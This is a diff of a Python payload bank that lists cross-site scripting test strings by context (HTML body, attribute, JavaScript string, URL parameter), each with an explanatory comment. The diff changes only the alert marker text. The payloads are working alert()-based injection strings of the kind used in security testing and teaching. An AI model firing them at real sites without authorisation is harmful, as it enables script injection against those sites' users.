@@ -1,4 +1,3 @@
-
 """
 payload_bank.py
 
@@ -31,23 +30,23 @@ PAYLOADS = {
 
     "html_body": [
 
-        "<script>alert('XSS-test')</script>",
+        "<script>alert('xss-skibidi-kaboom')</script>",
         # Basic XSS payload using a script tag.
         # Tests whether JavaScript inside a script element is allowed.
 
-        "<img src=x onerror=alert('XSS-test')>",
+        "<img src=x onerror=alert('xss-skibidi-kaboom')>",
         # Uses the img element and its onerror event handler.
         # Tests whether JavaScript can execute when image loading fails.
 
-        "<svg onload=alert('XSS-test')>",
+        "<svg onload=alert('xss-skibidi-kaboom')>",
         # Uses SVG onload event handler.
         # Tests whether JavaScript execution through SVG is possible.
 
-        "<iframe srcdoc=\"<script>alert('XSS-test')</script>\">",
+        "<iframe srcdoc=\"<script>alert('xss-skibidi-kaboom')</script>\">",
         # Uses iframe srcdoc to provide an HTML document inside an iframe.
         # Tests how the application handles embedded HTML content.
 
-        "<iframe src=\"javascript:alert(`xss`)\">",
+        "<iframe src=\"javascript:alert(`xss-skibidi-kaboom`)\">",
         # Uses a JavaScript URL inside an iframe source.
         # Intended to test handling of JavaScript URLs.
     ],
@@ -60,18 +59,18 @@ PAYLOADS = {
 
     "attribute": [
 
-        "\"><script>alert('XSS-test')</script>",
+        "\"><script>alert('xss-skibidi-kaboom')</script>",
         # Attempts to close the existing attribute and inject a script tag.
 
-        "\" onmouseover=\"alert('XSS-test')",
+        "\" onmouseover=\"alert('xss-skibidi-kaboom')",
         # Attempts to introduce an onmouseover event handler.
         # Tests event-handler handling without introducing a new HTML tag.
 
-        "' onfocus='alert(\"XSS-test\")' autofocus='",
+        "' onfocus='alert(\"xss-skibidi-kaboom\")' autofocus='",
         # Designed for an attribute that uses single quotation marks.
         # Attempts to introduce an onfocus event handler.
 
-        "javascript:alert('XSS-test')",
+        "javascript:alert('xss-skibidi-kaboom')",
         # Uses a JavaScript URL scheme.
         # Relevant to URL-based attributes such as href.
     ],
@@ -84,18 +83,18 @@ PAYLOADS = {
 
     "js_string": [
 
-        "\";alert('XSS-test');//",
+        "\";alert('xss-skibidi-kaboom');//",
         # Attempts to close a double-quoted string.
         # The // is used to comment out the remaining JavaScript code.
 
-        "';alert('XSS-test');//",
+        "';alert('xss-skibidi-kaboom');//",
         # Similar to the previous payload but targets single-quoted strings.
 
-        "\"+alert('XSS-test')+\"",
+        "\"+alert('xss-skibidi-kaboom')+\"",
         # Uses the JavaScript concatenation operator (+).
         # Tests how input behaves inside string concatenation.
 
-        "${alert('XSS-test')}",
+        "${alert('xss-skibidi-kaboom')}",
         # Uses template literal expression syntax.
         # Relevant when input is placed inside a JavaScript template literal.
     ],
@@ -108,18 +107,18 @@ PAYLOADS = {
 
     "url_param": [
 
-        "<script>alert('XSS-test')</script>",
+        "<script>alert('xss-skibidi-kaboom')</script>",
         # Raw HTML/JavaScript payload without URL encoding.
 
-        "%3Cscript%3Ealert('XSS-test')%3C/script%3E",
+        "%3Cscript%3Ealert('xss-skibidi-kaboom')%3C/script%3E",
         # URL-encoded version of the script payload.
         # Special characters are represented using percent encoding.
 
-        "%253Cscript%253Ealert('XSS-test')%253C/script%253E",
+        "%253Cscript%253Ealert('xss-skibidi-kaboom')%253C/script%253E",
         # Double URL-encoded version.
         # The percent sign (%) is encoded again as %25.
 
-        "%3Cimg%20src%3Dx%20onerror%3Dalert('XSS-test')%3E",
+        "%3Cimg%20src%3Dx%20onerror%3Dalert('xss-skibidi-kaboom')%3E",
         # URL-encoded image onerror payload.
         # Includes encoded spaces and HTML special characters.
     ],
@@ -173,5 +172,3 @@ def list_contexts():
     # .keys() retrieves all dictionary keys.
     # list() converts the keys into a normal Python list.
     return list(PAYLOADS.keys())
-
-
